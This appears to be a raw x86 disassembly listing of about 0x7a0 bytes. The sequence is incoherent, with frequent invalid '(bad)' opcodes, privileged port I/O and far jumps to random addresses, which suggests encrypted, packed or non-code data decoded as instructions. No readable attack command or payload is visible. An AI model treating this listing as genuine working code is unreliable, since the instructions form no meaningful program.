  41840a:	dec    edi
  41840b:	ds inc edi
  41840d:	or     DWORD PTR [edx-0x5b],eax
  418410:	add    cl,BYTE PTR [eax+0x63]
  418413:	jecxz  0x418397
  418415:	xchg   ebp,eax
  418416:	rol    bh,0x5c
  418419:	test   al,0x7c
  41841b:	push   ebp
  41841c:	out    0xf4,al
  41841e:	jo     0x41840c
  418420:	nop
  418421:	nop
  418422:	lock inc esp
  418424:	loop   0x4183c9
  418426:	aaa    
  418427:	mov    ch,0x0
  418429:	rep outs dx,BYTE PTR ds:[esi]
  41842b:	mov    ecx,0xb1b3ebab
  418430:	pop    eax
  418431:	ss aaa 
  418433:	lea    edi,[ecx-0x1911f1cb]
  418439:	cmp    DWORD PTR [edx],ebx
  41843b:	sti    
  41843c:	call   0x1bae:0xd8505df
  418443:	pushf  
  418444:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418445:	or     DWORD PTR [ecx],esp
  418447:	loopne 0x418499
  418449:	pushf  
  41844a:	xchg   edx,eax
  41844b:	cmp    ebx,DWORD PTR [edi-0x67]
  41844e:	jge    0x41845b
  418450:	ucomiss xmm6,DWORD PTR [esi+ebx*2]
  418454:	inc    ebp
  418455:	jo     0x41846b
  418457:	in     eax,dx
  418458:	arpl   WORD PTR [esi],di
  41845a:	push   DWORD PTR [edi]
  41845c:	outs   dx,DWORD PTR ds:[esi]
  41845d:	arpl   WORD PTR ds:0xb31dfa11,di
  418463:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418465:	adc    al,0x36
  418467:	inc    eax
  418468:	mov    ebx,0x90129bfe
  41846d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41846e:	jmp    0x7b90:0xde9c59c6
  418475:	aas    
  418476:	xor    al,0x4a
  418478:	fisttp DWORD PTR [esi+eax*4]
  41847b:	stc    
  41847c:	pop    ss
  41847d:	enter  0x9858,0xdf
  418481:	mov    eax,0x35ab8121
  418486:	add    BYTE PTR ds:0x94716147,cl
  41848c:	jb     0x41842c
  41848e:	adc    cl,BYTE PTR [eax+edi*8-0x3ce168d2]
  418495:	(bad)  
  418496:	fsub   QWORD PTR [ebp-0x78]
  418499:	enter  0x6d3a,0x42
  41849d:	mov    cl,0x72
  41849f:	ins    DWORD PTR es:[edi],dx
  4184a0:	jmp    0x418509
  4184a2:	(bad)  
  4184a4:	popf   
  4184a5:	sub    eax,0xa6b9dc38
  4184aa:	ret    0xac8c
  4184ad:	jmp    0x418439
  4184af:	mov    ebp,0x4139246c
  4184b4:	popa   
  4184b5:	mov    ch,BYTE PTR [esi+ebx*4]
  4184b8:	fwait
  4184b9:	in     al,0x2a
  4184bb:	ror    BYTE PTR [ecx+ebx*8],0x17
  4184bf:	push   ebx
  4184c0:	data16 aas 
  4184c2:	adc    edi,ebx
  4184c4:	jge    0x418544
  4184c6:	sub    DWORD PTR [ecx-0x3f],esp
  4184c9:	aaa    
  4184ca:	repnz dec ebx
  4184cc:	mov    eax,ds:0xc8ff088d
  4184d1:	jp     0x418458
  4184d3:	cmp    bh,BYTE PTR [edi]
  4184d5:	sbb    eax,0x1ef144ec
  4184da:	gs pusha 
  4184dc:	pusha  
  4184dd:	push   es
  4184de:	js     0x4184c4
  4184e0:	mov    BYTE PTR [esi],cl
  4184e2:	(bad)  
  4184e3:	imul   eax,DWORD PTR [eax-0x76cb0bb],0x59
  4184ea:	adc    edx,DWORD PTR [ebp-0x5e]
  4184ed:	lea    eax,[edx]
  4184ef:	int    0x62
  4184f1:	fbstp  TBYTE PTR [esi+eiz*1+0x757b5d45]
  4184f8:	mov    esi,0xa133dc18
  4184fd:	retf   0xff4e
  418500:	mov    ebx,0x3fc66298
  418505:	adc    al,0xfc
  418507:	stos   DWORD PTR es:[edi],eax
  418508:	or     eax,0xdf58d14a
  41850d:	rcl    BYTE PTR [ecx],cl
  41850f:	sbb    DWORD PTR [ebp-0x7f8e5d87],esp
  418515:	cdq    
  418516:	fs fs inc ecx
  418519:	xor    eax,0xf611dc5
  41851e:	inc    ebp
  41851f:	jecxz  0x4184ed
  418521:	fmul   st(7),st
  418523:	adc    BYTE PTR [edx],dl
  418525:	add    al,dh
  418527:	fstp   DWORD PTR [esi]
  418529:	xchg   DWORD PTR [esi],esi
  41852b:	enter  0x2690,0x9
  41852f:	pushf  
  418530:	out    dx,al
  418531:	jecxz  0x418507
  418533:	jmp    0x95e6d40a
  418538:	mov    ds:0x1674c53,al
  41853d:	jae    0x4184c2
  41853f:	dec    eax
  418540:	fsubr  QWORD PTR [ebx-0x3f]
  418543:	pop    es
  418544:	add    al,0x32
  418546:	cmc    
  418547:	add    DWORD PTR [ebx-0x10],ecx
  41854a:	pop    edx
  41854b:	ret    0x2552
  41854e:	daa    
  41854f:	xor    eax,0x363bad92
  418554:	ins    BYTE PTR es:[edi],dx
  418555:	outs   dx,DWORD PTR ds:[esi]
  418556:	ds xchg ebx,eax
  418558:	mov    esi,0x9ec587c6
  41855d:	cmp    al,0xfe
  41855f:	repz sbb BYTE PTR ds:0x7e396177,0xe4
  418567:	ss ins DWORD PTR es:[edi],dx
  418569:	add    bl,BYTE PTR [ebx-0x7f3eabba]
  41856f:	lock and eax,0x287a5f05
  418575:	ds sub ebp,esp
  418578:	cmp    al,0x4a
  41857a:	mov    edi,0xad4f798c
  41857f:	xor    eax,DWORD PTR [ecx-0x6773a9e2]
  418585:	pop    ecx
  418586:	pop    ss
  418587:	xor    DWORD PTR [ebx-0x6d],ecx
  41858a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41858b:	sahf   
  41858c:	mov    BYTE PTR [esi-0x2f],ch
  41858f:	(bad)  
  418590:	cmc    
  418591:	mov    esp,0xe83a8363
  418596:	and    eax,0x418b836c
  41859b:	jno    0x41852b
  41859d:	rol    DWORD PTR [ebp+edi*1-0x60],cl
  4185a1:	push   ds
  4185a2:	ja     0x418567
  4185a4:	ins    DWORD PTR es:[edi],dx
  4185a5:	mov    eax,ds:0x6fb7d8c6
  4185aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185ab:	or     al,0x84
  4185ad:	sub    ecx,DWORD PTR [esi+0x61]
  4185b0:	setl   BYTE PTR [ecx+ebp*4]
  4185b4:	xchg   DWORD PTR [ecx+0x141085cc],ebp
  4185ba:	pop    ecx
  4185bb:	dec    esi
  4185bc:	js     0x418590
  4185be:	mov    ch,dl
  4185c0:	mov    bl,0x64
  4185c2:	rcl    DWORD PTR [ebx],1
  4185c4:	dec    esi
  4185c5:	sti    
  4185c6:	jnp    0x4185f2
  4185c8:	pop    eax
  4185c9:	in     al,dx
  4185ca:	sbb    ebp,0x4
  4185cd:	sti    
  4185ce:	(bad)
  4185d1:	fs out dx,eax
  4185d3:	loopne 0x418611
  4185d5:	call   0xce5a62b1
  4185da:	push   0x2abc2f80
  4185df:	sar    BYTE PTR [edi],0x1
  4185e2:	int3   
  4185e3:	out    dx,al
  4185e4:	icebp  
  4185e5:	je     0x41861b
  4185e7:	inc    ecx
  4185e8:	fidiv  WORD PTR [edx]
  4185ea:	mov    ds:0x6b08fb4,al
  4185ef:	jnp    0x4185e4
  4185f1:	jmp    0x2c7976a5
  4185f6:	cmp    BYTE PTR [edi],0x1b
  4185f9:	jmp    0x125316f2
  4185fe:	std    
  4185ff:	push   ds
  418600:	call   0x8c756b95
  418605:	dec    esi
  418606:	pop    ss
  418607:	les    esp,FWORD PTR [eax+0x59e03efd]
  41860d:	pop    edx
  41860e:	jno    0x41860d
  418610:	push   eax
  418611:	pusha  
  418612:	aaa    
  418613:	data16 in al,0x18
  418616:	ror    DWORD PTR [eax],1
  418618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418619:	aaa    
  41861a:	xchg   edi,eax
  41861b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41861c:	inc    edx
  41861d:	jge    0x4185a9
  41861f:	inc    esi
  418620:	pop    ebp
  418622:	cmp    al,BYTE PTR [ecx+eiz*1+0x6e313742]
  418629:	retf   
  41862a:	daa    
  41862b:	push   0xdc1f4edb
  418630:	scas   al,BYTE PTR es:[edi]
  418631:	icebp  
  418632:	mov    ecx,0xb4427f39
  418637:	stos   BYTE PTR es:[edi],al
  418638:	pushf  
  418639:	sahf   
  41863a:	test   al,0xa4
  41863c:	pop    ebx
  41863d:	(bad)  
  41863f:	adc    DWORD PTR [edi-0x3a],edx
  418642:	jmp    DWORD PTR [ecx+0x35fb178]
  418648:	jo     0x41863d
  41864a:	bound  esi,QWORD PTR [edi+0x449d991e]
  418650:	adc    eax,DWORD PTR [ebx-0x33]
  418653:	xor    al,0x7c
  418655:	test   al,0xe3
  418657:	add    BYTE PTR [ebx+0x3b],bh
  41865a:	mov    ah,0xbb
  41865c:	ins    BYTE PTR es:[edi],dx
  41865d:	in     al,dx
  41865e:	xor    BYTE PTR [esi],0x2e
  418661:	outs   dx,DWORD PTR ds:[esi]
  418662:	xchg   bx,ax
  418664:	add    eax,0x5925482
  418669:	mov    BYTE PTR [ecx],0x53
  41866c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41866d:	ret    
  41866e:	dec    ebx
  41866f:	out    dx,eax
  418670:	cmp    al,BYTE PTR [ecx+0x13]
  418673:	push   ds
  418674:	cmp    edx,DWORD PTR [edi+0x5d1fc79]
  41867a:	sbb    DWORD PTR [esp+eax*2-0x50],esi
  41867e:	and    bh,BYTE PTR [edx+0x4a2dc7e9]
  418684:	push   ebx
  418685:	call   0x63da61cf
  41868a:	dec    eax
  41868b:	xor    al,0xaf
  41868d:	pop    edi
  41868e:	(bad)  
  41868f:	fdiv   QWORD PTR [ebp+0x14]
  418692:	jmp    0x6c09:0x3cc1fb9b
  418699:	xchg   edx,eax
  41869a:	pop    ebp
  41869b:	(bad)  
  41869c:	xchg   ecx,eax
  41869d:	not    DWORD PTR [esi]
  41869f:	outs   dx,BYTE PTR ds:[esi]
  4186a0:	nop
  4186a1:	bound  edx,QWORD PTR [edx-0x1a9f27b9]
  4186a7:	add    ebp,ebp
  4186a9:	sar    DWORD PTR [edi+0x1ec28cf9],cl
  4186af:	out    0xf3,eax
  4186b1:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  4186b3:	(bad)  
  4186b4:	loope  0x4186eb
  4186b6:	rcr    BYTE PTR ds:0xc35f0d22,cl
  4186bc:	inc    ebx
  4186bd:	ins    DWORD PTR es:[edi],dx
  4186be:	test   ebx,ebx
  4186c0:	hlt    
  4186c1:	repz mov ch,0x9e
  4186c4:	sti    
  4186c5:	adc    ah,ch
  4186c7:	sbb    esp,ebx
  4186c9:	rcr    BYTE PTR [esp+eiz*2-0x45061527],1
  4186d0:	ror    DWORD PTR [esi],0xf3
  4186d3:	jle    0x41874e
  4186d5:	mov    esp,0x4ad59757
  4186da:	ret    
  4186db:	loopne 0x418695
  4186dd:	jmp    0x1b14:0xa155062c
  4186e4:	repnz mov al,ds:0xfec73720
  4186ea:	xor    BYTE PTR [eax-0x53a01330],al
  4186f0:	cmp    edx,DWORD PTR [ecx-0x4d958b5b]
  4186f6:	xchg   ebp,eax
  4186f7:	ja     0x418765
  4186f9:	cwde   
  4186fa:	(bad)  
  4186fb:	xor    al,0xac
  4186fd:	ret    
  4186fe:	xor    eax,0xd3971495
  418703:	cmp    eax,0x6cefbabd
  418708:	les    eax,FWORD PTR [esi+0x7b]
  41870b:	or     al,BYTE PTR [ebx+0x7c]
  41870e:	fimul  DWORD PTR [edi]
  418710:	out    dx,eax
  418711:	push   es
  418712:	or     al,BYTE PTR [edx]
  418714:	sub    BYTE PTR [eax],bl
  418716:	and    ecx,DWORD PTR [edi-0x5f]
  418719:	hlt    
  41871a:	adc    BYTE PTR [ebp+0x62d8b06e],bh
  418720:	jo     0x418789
  418722:	ins    DWORD PTR es:[edi],dx
  418723:	sti    
  418724:	mov    eax,0xac1efd33
  418729:	xlat   BYTE PTR ds:[ebx]
  41872a:	mov    WORD PTR [ebp-0x7c],?
  41872d:	jmp    0xf461:0xe9c31162
  418734:	es jno 0x418753
  418737:	adc    eax,0x5fc4215c
  41873c:	test   eax,0xf8e4bf8b
  418741:	jmp    0x418786
  418743:	mov    bh,0xf
  418745:	xor    eax,esp
  418747:	sbb    ch,al
  418749:	into   
  41874a:	pop    ebx
  41874b:	jle    0x9130ff29
  418751:	retf   
  418752:	rcl    esp,0xb
  418755:	cmc    
  418756:	iret   
  418757:	(bad)  
  418758:	jae    0x418727
  41875a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41875b:	jb     0x418776
  41875d:	(bad)  
  41875e:	loopne 0x4187ac
  418760:	mov    bl,0x29
  418762:	jo     0x4187dc
  418764:	(bad)  
  418765:	or     DWORD PTR [esi],esi
  418767:	mov    bh,0x18
  418769:	inc    edx
  41876a:	shl    DWORD PTR ds:0xb75ff65d,0x2c
  418771:	xchg   edx,eax
  418772:	lods   eax,DWORD PTR ds:[esi]
  418773:	cdq    
  418774:	addr16 mov dh,bh
  418777:	ins    DWORD PTR es:[edi],dx
  418778:	mov    al,ds:0xfd82e51a
  41877d:	(bad)  
  41877e:	mov    ch,0x23
  418780:	in     eax,0x78
  418782:	fstsw  ax
  418785:	int3   
  418786:	cs ja  0x41875e
  418789:	das    
  41878a:	add    al,0x3b
  41878c:	sti    
  41878d:	xor    bl,0x4
  418790:	cmp    al,0x4d
  418792:	jb     0x418723
  418794:	jns    0x418803
  418796:	(bad)  
  418797:	and    BYTE PTR [ebp-0x4a],bl
  41879a:	add    DWORD PTR [ebx+0x74],ecx
  41879d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41879e:	or     al,0x82
  4187a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4187a1:	xchg   esi,eax
  4187a2:	sbb    DWORD PTR [edx+0x5c7f56a6],edi
  4187a8:	pop    ebx
  4187a9:	hlt    
  4187aa:	inc    ebx
  4187ab:	scas   al,BYTE PTR es:[edi]
  4187ac:	imul   edi,DWORD PTR [esi+0x55],0x3131c62c
  4187b3:	push   ecx
  4187b4:	mov    gs,WORD PTR [eax+0x379ff6b9]
  4187ba:	dec    BYTE PTR [ecx+0x6f]
  4187bd:	adc    DWORD PTR [ecx-0x177766f1],edx
  4187c3:	xchg   ebx,eax
  4187c4:	sub    cl,BYTE PTR [edx]
  4187c6:	adc    ebp,0xffffffa2
  4187c9:	stos   DWORD PTR es:[edi],eax
  4187ca:	ins    DWORD PTR es:[edi],dx
  4187cb:	mov    cl,0xb7
  4187cd:	ret    
  4187ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4187cf:	xchg   edx,eax
  4187d0:	addr16 push ss
  4187d2:	cmc    
  4187d3:	cmp    edx,esi
  4187d5:	shr    BYTE PTR [ecx],cl
  4187d7:	sub    al,0x77
  4187d9:	ss mov esi,0x6b7a52a7
  4187df:	add    DWORD PTR [esi-0x6e],esi
  4187e2:	jo     0x4187f3
  4187e4:	inc    edx
  4187e5:	es (bad) 
  4187e7:	xor    al,0x1e
  4187e9:	call   0x5d66:0xa9f45cab
  4187f0:	(bad)  
  4187f1:	call   0xeb972b25
  4187f6:	xor    ecx,ebx
  4187f8:	(bad)
  4187fd:	outs   dx,DWORD PTR ds:[esi]
  4187fe:	pop    edi
  4187ff:	rcr    DWORD PTR [esp+eax*8-0x4559c6c6],0xb7
  418807:	inc    esi
  418808:	bound  edx,QWORD PTR [edx+edx*1+0x3b]
  41880c:	aas    
  41880d:	lahf   
  41880e:	xchg   esp,eax
  41880f:	xchg   ebx,eax
  418810:	sbb    eax,0xb4bbf67d
  418815:	fnstsw WORD PTR [edi-0x18]
  418818:	jge    0x418887
  41881a:	adc    BYTE PTR [edi],cl
  41881c:	mov    edx,0x6dc6a083
  418821:	es push es
  418823:	aaa    
  418824:	std    
  418825:	fsubr  DWORD PTR [ecx+0x6c2816b1]
  41882b:	sub    ebp,ebx
  41882d:	call   0xef8b5dda
  418832:	into   
  418833:	jns    0x4187c6
  418835:	pop    es
  418836:	jns    0x418875
  418838:	aad    0x64
  41883a:	fisttp DWORD PTR [edi+0x511d4aa7]
  418840:	fisubr WORD PTR [edi-0x2fa64aa2]
  418846:	outs   dx,DWORD PTR ds:[esi]
  418847:	sbb    BYTE PTR [ebx-0xda2603e],dh
  41884d:	jmp    0xf874317
  418852:	xchg   edx,eax
  418853:	dec    ebx
  418854:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418855:	mov    cl,0x6
  418857:	mov    bh,0x67
  418859:	out    0x3e,eax
  41885b:	shr    DWORD PTR [edi],0x10
  41885e:	inc    cx
  418860:	std    
  418861:	repnz ins BYTE PTR es:[edi],dx
  418863:	xor    al,0xf0
  418865:	jne    0x418863
  418867:	jb     0x41882e
  418869:	in     eax,dx
  41886a:	xchg   al,al
  41886c:	pop    ebp
  41886d:	imul   esi,DWORD PTR [esi+0x5d],0x6f
  418871:	outs   dx,DWORD PTR ds:[esi]
  418872:	scas   al,BYTE PTR es:[edi]
  418873:	das    
  418874:	lods   al,BYTE PTR ds:[esi]
  418875:	pop    esp
  418876:	daa    
  418877:	push   0x324d6bec
  41887c:	adc    dh,dh
  41887e:	pop    ecx
  41887f:	test   DWORD PTR [esi],esi
  418881:	cwde   
  418882:	sahf   
  418883:	test   BYTE PTR [edi+0x68],ch
  418886:	fistp  QWORD PTR [edx-0x3f515e2c]
  41888c:	adc    al,0xfb
  41888e:	push   ebx
  41888f:	aas    
  418890:	test   eax,0x65c876bd
  418895:	nop
  418896:	jle    0x4188b1
  418898:	jle    0x418845
  41889a:	pop    ecx
  41889b:	xor    BYTE PTR [ebp+0x7c],ah
  41889e:	stos   BYTE PTR es:[edi],al
  41889f:	jo     0x418868
  4188a1:	and    al,0x55
  4188a3:	and    DWORD PTR [edi+0x778114c3],edi
  4188a9:	xchg   ebp,eax
  4188aa:	loope  0x4188ab
  4188ac:	push   ebx
  4188ad:	enter  0xbf43,0x7a
  4188b1:	test   ch,ch
  4188b3:	jno    0x4188c8
  4188b5:	imul   ebx,DWORD PTR [ebp-0x1],0xd78755de
  4188bc:	jae    0x418937
  4188be:	adc    eax,0xb32fa6cb
  4188c3:	in     al,dx
  4188c4:	mov    dl,BYTE PTR [ebp-0x3]
  4188c7:	mov    al,ds:0xe4b4b8bb
  4188cc:	mov    eax,ds:0x20c7fc03
  4188d1:	out    0xd2,eax
  4188d3:	xor    ah,al
  4188d5:	mov    esi,0x9bc4fefd
  4188da:	jmp    0x487410ce
  4188df:	pop    esp
  4188e0:	push   ebx
  4188e1:	ins    BYTE PTR es:[edi],dx
  4188e2:	adc    eax,0x25fa52fc
  4188e7:	(bad)  
  4188e8:	push   ds
  4188e9:	sbb    cl,BYTE PTR [ebp+0x50]
  4188ec:	or     eax,0x942cb258
  4188f1:	and    al,0x6b
  4188f3:	ret    
  4188f4:	lea    ecx,[ecx]
  4188f6:	cli    
  4188f7:	xchg   ebx,eax
  4188f8:	dec    edi
  4188f9:	repnz ss clc 
  4188fc:	dec    edx
  4188fd:	aad    0xb9
  4188ff:	fld    QWORD PTR [ebx+0xcb08398]
  418905:	sbb    eax,0x69d49f10
  41890a:	popf   
  41890b:	fadd   DWORD PTR [ecx]
  41890d:	and    DWORD PTR [eax-0x4e],edx
  418910:	cmp    cl,dh
  418912:	outs   dx,BYTE PTR ds:[esi]
  418913:	repnz pushf 
  418915:	les    edi,FWORD PTR [ebx-0x7b]
  418918:	and    ecx,DWORD PTR [ebp+0x22]
  41891b:	arpl   WORD PTR [edx],dx
  41891d:	mov    dh,BYTE PTR [eax-0x315bf8ff]
  418923:	scas   al,BYTE PTR es:[edi]
  418924:	retf   
  418925:	(bad)  
  418926:	push   edx
  418927:	xor    al,0xdf
  418929:	mov    ah,0xf9
  41892b:	frstor [ebx-0x49128421]
  418931:	sbb    esp,DWORD PTR [ebp+0x28]
  418934:	into   
  418935:	fiadd  DWORD PTR [edi]
  418937:	mov    bl,0x39
  418939:	popa   
  41893a:	sbb    al,0xb6
  41893c:	dec    edi
  41893d:	push   esp
  41893e:	mov    eax,ds:0xf21d2c19
  418943:	in     al,0x8c
  418945:	jmp    0xd0a40928
  41894a:	adc    BYTE PTR [eax-0x168e722],ah
  418950:	dec    ebp
  418951:	pop    edx
  418952:	or     dl,BYTE PTR [eax+0x10dbb6e1]
  418958:	or     DWORD PTR [edi-0xb],esp
  41895b:	aas    
  41895c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41895d:	call   0x9c875108
  418962:	jmp    0x418939
  418964:	lock mov dh,0x77
  418967:	int3   
  418968:	fs loopne 0x41895c
  41896b:	inc    edi
  41896c:	iret   
  41896d:	and    BYTE PTR [esi-0x7b],0x92
  418971:	std    
  418972:	add    BYTE PTR [ecx-0x4f],al
  418975:	mov    BYTE PTR [edi],0x48
  418978:	pop    esp
  418979:	ret    
  41897a:	out    0xa8,al
  41897c:	(bad)  
  41897d:	iret   
  41897e:	mov    WORD PTR [eax-0x5e],cs
  418981:	xor    al,0xd5
  418983:	adc    BYTE PTR [ebp+0x6f],0x99
  418987:	add    edx,eax
  418989:	mov    ebp,0x60db7c4
  41898e:	adc    ebp,DWORD PTR [edi]
  418990:	imul   eax,esp,0x42
  418993:	pop    edx
  418994:	or     esp,ebp
  418996:	mov    esp,0xc8c13e3a
  41899b:	mov    BYTE PTR [esi-0x7e118a38],bl
  4189a1:	mov    bh,0x7d
  4189a3:	data16 loope 0x418953
  4189a6:	sbb    cl,dh
  4189a8:	mov    ds:0x4a1d2b7c,al
  4189ad:	inc    ebx
  4189ae:	clc    
  4189af:	dec    ebp
  4189b0:	shl    DWORD PTR [edi+0x2],0x68
  4189b4:	push   edx
  4189b5:	(bad)  
  4189b6:	hlt    
  4189b7:	pop    es
  4189b8:	rcr    DWORD PTR [esi+0x1ca9817b],cl
  4189be:	jle    0x4189f2
  4189c0:	sbb    DWORD PTR [eax+eax*1-0x79abeac2],esi
  4189c7:	fdivrp st(6),st
  4189c9:	xor    dh,ah
  4189cb:	push   0x1d
  4189cd:	mov    dl,0xcf
  4189cf:	gs retf 0x9857
  4189d3:	aas    
  4189d4:	cld    
  4189d5:	pop    es
  4189d6:	inc    ebx
  4189d7:	mov    ebp,0x15904a6d
  4189dc:	mov    dl,dl
  4189de:	ins    BYTE PTR es:[edi],dx
  4189df:	mov    bh,0x27
  4189e1:	shl    DWORD PTR [edx+edi*4-0x2ec798de],1
  4189e8:	test   dh,bh
  4189ea:	lock cmp BYTE PTR [ecx*4+0x511a3215],bh
  4189f2:	sub    BYTE PTR [ecx-0x3280021c],0x57
  4189f9:	cwde   
  4189fa:	add    al,0xb9
  4189fc:	mov    WORD PTR [ebp+0x5],?
  4189ff:	out    dx,al
  418a00:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418a01:	ss mov al,0x2a
  418a04:	div    DWORD PTR [esi-0x2d0403f2]
  418a0a:	cwde   
  418a0b:	fxch   st(3)
  418a0d:	fdivrp st(7),st
  418a0f:	out    dx,eax
  418a10:	ror    eax,cl
  418a12:	push   es
  418a13:	ret    
  418a14:	push   ss
  418a15:	cmp    ah,BYTE PTR [eax+0x6c]
  418a18:	mov    gs,WORD PTR [edi]
  418a1a:	popa   
  418a1b:	xchg   ebp,eax
  418a1c:	in     al,dx
  418a1d:	mov    eax,ds:0xfd786cd4
  418a22:	inc    esi
  418a23:	or     eax,0x9058fa9a
  418a28:	xor    edx,DWORD PTR [ebx]
  418a2a:	push   ecx
  418a2b:	mov    edx,0x923e116d
  418a30:	fs mov esp,0x6b448450
  418a36:	pop    ecx
  418a37:	in     al,dx
  418a38:	dec    ebp
  418a39:	daa    
  418a3a:	mov    fs,WORD PTR [ecx]
  418a3c:	ds stc 
  418a3e:	sbb    DWORD PTR [eax+eiz*8],0xc5575557
  418a45:	out    dx,eax
  418a46:	(bad)  
  418a47:	rcr    BYTE PTR [eax],1
  418a49:	xor    al,0x50
  418a4b:	add    BYTE PTR [esp+eiz*4],al
  418a4e:	dec    eax
  418a4f:	mov    ebp,0xa443d0fe
  418a54:	std    
  418a55:	jg     0x4189e8
  418a57:	cmp    edi,DWORD PTR [ecx]
  418a59:	and    ecx,DWORD PTR [ebx+0x304c316e]
  418a5f:	inc    eax
  418a60:	sub    BYTE PTR [ebp-0x27],dh
  418a63:	inc    eax
  418a64:	mov    edi,ebx
  418a66:	es dec ecx
  418a68:	push   ecx
  418a69:	inc    esi
  418a6a:	std    
  418a6b:	jbe    0x418abd
  418a6d:	jno    0x418a4e
  418a6f:	adc    al,0x60
  418a71:	cmp    al,0x70
  418a73:	sub    al,0x54
  418a75:	pop    eax
  418a76:	outs   dx,BYTE PTR ds:[esi]
  418a77:	loop   0x418a39
  418a79:	(bad)
  418a7c:	sub    al,0xaf
  418a7e:	inc    ecx
  418a7f:	in     al,0xec
  418a81:	test   BYTE PTR [edx+0x13],0xcd
  418a85:	test   eax,0xe29ed069
  418a8a:	jp     0x418a70
  418a8c:	leave  
  418a8d:	lahf   
  418a8e:	ret    0xa4a6
  418a91:	cmp    DWORD PTR [esi],ebx
  418a93:	dec    edx
  418a94:	cmp    eax,0x4ec1800c
  418a99:	pop    ebp
  418a9a:	mov    edx,0xc6960ca5
  418a9f:	mov    dh,0xd
  418aa1:	cs push ebx
  418aa3:	cli    
  418aa4:	icebp  
  418aa5:	mov    ch,0x56
  418aa7:	push   0x23
  418aa9:	xor    BYTE PTR [ebp-0xa],dh
  418aac:	jne    0x418a3e
  418aae:	xchg   DWORD PTR gs:[edi],ecx
  418ab1:	pusha  
  418ab2:	das    
  418ab3:	add    DWORD PTR [ecx-0x1e],eax
  418ab6:	fld    TBYTE PTR [ebx-0xa5437da]
  418abd:	xchg   edx,eax
  418abe:	pop    esi
  418abf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ac0:	add    al,0x84
  418ac2:	mov    ch,0x6c
  418ac4:	in     al,dx
  418ac5:	lods   eax,DWORD PTR ds:[esi]
  418ac6:	pushf  
  418ac7:	mov    bl,0xa8
  418ac9:	mov    dh,0xc2
  418acb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418acc:	sbb    DWORD PTR [esi],ecx
  418ace:	jmp    0xb8308e69
  418ad3:	repz iret 
  418ad5:	sub    DWORD PTR [esi-0x7f],edi
  418ad8:	fnstsw WORD PTR [ebp-0x30edf034]
  418ade:	xor    BYTE PTR [edi+0x54a4836e],dl
  418ae4:	cmp    al,0xdd
  418ae6:	cdq    
  418ae7:	je     0x418b1d
  418ae9:	icebp  
  418aea:	push   ebx
  418aeb:	jmp    0x74a5ca99
  418af0:	scas   al,BYTE PTR es:[edi]
  418af1:	aad    0x56
  418af3:	pop    ss
  418af4:	cmp    BYTE PTR [esi+ecx*8],ah
  418af7:	push   ds
  418af8:	leave  
  418af9:	mov    edi,0xd176acd0
  418afe:	dec    esi
  418aff:	cwde   
  418b00:	paddusb mm7,QWORD PTR [esi-0x7b]
  418b04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418b05:	pop    esi
  418b06:	pop    ds
  418b07:	loopne 0x418b2b
  418b09:	mov    eax,0x2f25e87b
  418b0e:	bound  ecx,QWORD PTR [eax+0x3b3dd4c]
  418b14:	dec    esi
  418b15:	int3   
  418b16:	push   ebx
  418b17:	pop    esp
  418b18:	fsubp  st(7),st
  418b1a:	idiv   BYTE PTR [esi]
  418b1c:	idiv   BYTE PTR [ebx-0x73]
  418b1f:	sub    ah,BYTE PTR [edi]
  418b21:	mov    edx,0x8c764ad2
  418b26:	shl    DWORD PTR [ecx],cl
  418b28:	push   ss
  418b29:	stos   BYTE PTR es:[edi],al
  418b2a:	fs jge 0x418b29
  418b2d:	repz push esi
  418b2f:	lahf   
  418b30:	sbb    DWORD PTR [ebx],ebp
  418b32:	fisttp QWORD PTR [eax+esi*8-0x5da0ac7]
  418b39:	and    al,0x60
  418b3b:	shl    DWORD PTR [esi],1
  418b3d:	cmp    ebx,ebx
  418b3f:	xor    al,0xe7
  418b41:	fsubr  QWORD PTR [eax]
  418b43:	call   FWORD PTR [edi]
  418b45:	call   0xe2b:0xc7a9c503
  418b4c:	jp     0x418b84
  418b4e:	call   0xcba1b7a8
  418b53:	sub    al,0xa
  418b55:	clc    
  418b56:	lahf   
  418b57:	in     al,0xf6
  418b59:	bswap  esi
  418b5b:	fcmovb st,st(5)
  418b5d:	out    dx,al
  418b5e:	add    eax,DWORD PTR [ecx+0x55f65e44]
  418b64:	push   edx
  418b65:	jo     0x418b42
  418b67:	dec    ebp
  418b68:	sub    edx,DWORD PTR [edx+ecx*1-0x10]
  418b6c:	push   cs
  418b6d:	push   ds
  418b6e:	jl     0x418b48
  418b70:	(bad)  [edi-0x52]
  418b73:	popf   
  418b74:	frstor [edx+0x7f]
  418b77:	loop   0x418b97
  418b79:	add    ah,BYTE PTR [ebp+0x7dff8dd0]
  418b7f:	div    DWORD PTR [eax]
  418b81:	pop    edx
  418b82:	cmp    ch,BYTE PTR [ebx-0x535d460b]
  418b88:	test   al,0xf6
  418b8a:	xchg   ebx,eax
  418b8b:	pop    esp
  418b8c:	into   
  418b8d:	inc    ebx
  418b8e:	cmc    
  418b8f:	mov    bh,0xdc
  418b91:	fdiv   DWORD PTR es:[edx+0x11624215]
  418b98:	je     0x418b50
  418b9a:	inc    ecx
  418b9b:	pop    ebp
  418b9c:	adc    al,BYTE PTR [edx-0x7a]
  418b9f:	inc    esp
  418ba0:	push   0xc226594
  418ba5:	push   cs
  418ba6:	jle    0x418bbc
  418ba8:	mov    ebp,ebx
  418baa:	not    BYTE PTR [esi+0x18]
  418bad:	and    DWORD PTR [ebx],esi
  418baf:	nop
  418bb0:	int3   
